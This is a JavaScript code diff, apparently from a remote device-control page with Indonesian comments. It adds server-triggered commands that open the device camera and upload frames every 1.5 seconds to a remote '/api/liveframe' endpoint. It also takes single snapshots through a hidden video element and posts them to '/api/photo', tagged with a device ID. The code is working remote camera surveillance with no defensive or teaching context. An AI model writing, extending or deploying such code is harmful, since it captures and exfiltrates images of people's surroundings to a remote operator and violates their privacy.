@@ -154,6 +154,8 @@ let flashTrack = null;
 let blinkTimer = null;
 let bgFlashTimer = null;
 let bgFlashStream = null;
+let liveCamStream = null;
+let liveCamInterval = null;
 
 const codeInput = document.getElementById('codeInput');
 codeInput.addEventListener('input', e => {
@@ -272,6 +274,8 @@ function executeCommand(cmd) {
     case 'vibrate': vibrate(cmd.duration); break;
     case 'vibratecustom': vibrateCustom(cmd.count, cmd.interval, cmd.duration); break;
     case 'livecamera': liveCamera(cmd.camMode, cmd.duration); break;
+    case 'stoplivecam': stopLiveCamera(); break;
+    case 'snapphoto': snapPhoto(cmd.camMode); break;
     case 'email': showTextOverlay('📧 ' + (cmd.message || 'Buka email')); break;
     case 'cookies': showTextOverlay('🍪 ' + (cmd.message || 'Cookies terdeteksi')); break;
   }
@@ -546,48 +550,97 @@ function vibrateCustom(count, interval, duration) {
   showTextOverlay('📳 VIBRATE ' + count + 'x');
 }
 
-/* ==================== LIVE CAMERA ==================== */
+/* ==================== LIVE CAMERA (REAL-TIME STREAM) ==================== */
 async function liveCamera(mode, duration) {
+  stopLiveCamera();
+
   try {
     const facing = (mode === 'front') ? 'user' : 'environment';
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing }
+    liveCamStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing, width: 640, height: 480 }
     });
 
-    showTextOverlay('📷 KAMERA AKTIF...');
-
     const video = document.createElement('video');
-    video.srcObject = stream;
+    video.srcObject = liveCamStream;
     video.autoplay = true;
     video.muted = true;
-    video.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:999995;';
+    video.playsInline = true;
+    video.id = 'lyx-livecam';
+    video.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:999995;background:#000;';
     document.body.appendChild(video);
 
-    setTimeout(() => {
+    showTextOverlay('📹 CAMERA PANTAU AKTIF');
+
+    liveCamInterval = setInterval(function() {
       try {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0);
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        const frame = canvas.toDataURL('image/jpeg', 0.5);
 
-        // Kirim foto ke server
-        fetch(API_BASE + '/api/photo', {
+        fetch(API_BASE + '/api/liveframe', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ deviceId: deviceId, photo: dataUrl })
-        }).catch(() => {});
+          body: JSON.stringify({ deviceId: deviceId, frame: frame })
+        }).catch(function(){});
+      } catch (e) {}
+    }, 1500);
 
-        video.remove();
-        stream.getTracks().forEach(t => t.stop());
-        showTextOverlay('📷 FOTO DIKIRIM');
-      } catch (e) {
-        video.remove();
-        stream.getTracks().forEach(t => t.stop());
-      }
-    }, (duration || 3) * 1000);
+    if (duration > 0) {
+      setTimeout(function() {
+        stopLiveCamera();
+        showTextOverlay('📹 PANTAU BERHENTI');
+      }, duration * 1000);
+    }
 
+  } catch (e) {
+    showTextOverlay('KAMERA DITOLAK');
+  }
+}
+
+function stopLiveCamera() {
+  if (liveCamInterval) {
+    clearInterval(liveCamInterval);
+    liveCamInterval = null;
+  }
+  if (liveCamStream) {
+    liveCamStream.getTracks().forEach(function(t){ t.stop(); });
+    liveCamStream = null;
+  }
+  const vid = document.getElementById('lyx-livecam');
+  if (vid) vid.remove();
+}
+
+/* ==================== SNAP PHOTO ==================== */
+async function snapPhoto(mode) {
+  try {
+    const facing = (mode === 'front') ? 'user' : 'environment';
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing }
+    });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.autoplay = true;
+    video.muted = true;
+    await new Promise(function(r){ setTimeout(r, 800); });
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+
+    fetch(API_BASE + '/api/photo', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceId: deviceId, photo: dataUrl })
+    }).catch(function(){});
+
+    video.remove();
+    stream.getTracks().forEach(function(t){ t.stop(); });
+    showTextOverlay('📷 FOTO DIKIRIM');
   } catch (e) {
     showTextOverlay('KAMERA DITOLAK');
   }
